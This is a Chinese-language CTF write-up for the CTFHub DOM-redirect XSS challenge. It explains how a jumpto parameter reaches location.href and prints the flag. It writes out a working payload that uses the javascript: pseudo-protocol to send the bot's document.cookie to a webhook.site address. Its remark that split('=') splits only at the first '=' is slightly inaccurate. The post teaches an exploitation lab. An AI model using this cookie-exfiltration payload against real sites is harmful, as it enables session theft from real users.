---
layout: post
title: "CTFHub XSS - DOM跳转"
date: 2026-10-17
categories: ctfhub
tags: [ctfhub,web,xss,DOM跳转XSS,javascript伪协议,OAST]
permalink: /ctfhub/xss-dom-jumpto.html
---

# CTFHub XSS - DOM跳转
## 一、题目信息
平台：CTFHub
分类：Web - XSS
题目名称：DOM跳转
难度：简单
Flag：`ctfhub{469f3406393f0b704a59c187}`

## 二、考点
1. DOM型XSS原理：漏洞发生在前端浏览器，后端不处理、不存储Payload
2. `location.href`可控跳转，`javascript:`伪协议执行JS
3. Send URL to Bot 机制，Bot访问恶意URL触发前端漏洞
4. OAST平台webhook.site外带Cookie，获取Bot端Cookie
5. `split("=")`参数分割坑点，Payload内`=`会截断代码

## 三、题目内容
页面JumpTo输入框为禁用状态，无法手动输入。页面JS读取URL参数`jumpto`，使用`split("=")`分割参数，直接将`target[1]`赋值给`location.href`实现页面跳转。
页面提供`Send URL to Bot`功能，可以提交URL让Bot访问。flag存放在Bot的Cookie中，我们需要构造Payload读取Bot的Cookie。
> 本题JS使用`location.search.split("=")`分割参数，只会分割第一个`=`。Payload内部如果包含`=`，会截断JS代码，导致payload失效。

## 四、解题步骤
1. 漏洞探测
构造测试Payload：`javascript:alert(1)`，拼接URL访问，页面弹出alert弹窗，证明存在DOM跳转XSS，可以执行javascript伪协议代码。

2. OAST平台准备
打开webhook.site，新建监听地址，生成专属Webhook地址。利用`location`跳转携带Cookie发送到监听平台。

3. 构造恶意URL
完整恶意URL：
`http://challenge-adda20ac3cda5e0a.sandbox.ctfhub.com:10800/?jumpto=javascript:location='https://webhook.site/你的专属Token/'+document.cookie`

4. 发送恶意URL给Bot
将完整恶意URL粘贴到页面`Send URL to Bot`输入框，点击Send。Bot访问该URL，浏览器执行javascript伪协议，执行JS，读取Bot的Cookie并上传到webhook.site平台。

5. 获取flag
在webhook.site后台查看捕获的请求记录，在请求URL中拿到Cookie，提取Cookie内的flag。

## 五、知识点解析
1. DOM跳转XSS：属于DOM XSS，漏洞根源是前端直接把可控URL参数赋值给location.href，支持javascript伪协议执行JS。
2. `location`：页面跳转，直接拼接Cookie到目标地址，跨域限制更少，稳定性优于fetch。
3. `split("=")`坑点：只按第一个等号分割URL参数，Payload内部不能出现多余`=`，否则JS代码会被截断失效。

## 六、总结
本题是经典DOM跳转XSS，页面输入框只是展示，无法输入，只能构造URL参数。
使用webhook.site作为OAST外带平台，通过location跳转将Bot的Cookie外带，查看请求记录拿到flag。做题时重点注意`split("=")`分割逻辑，Payload内部多余等号会直接导致代码截断，Payload失效。
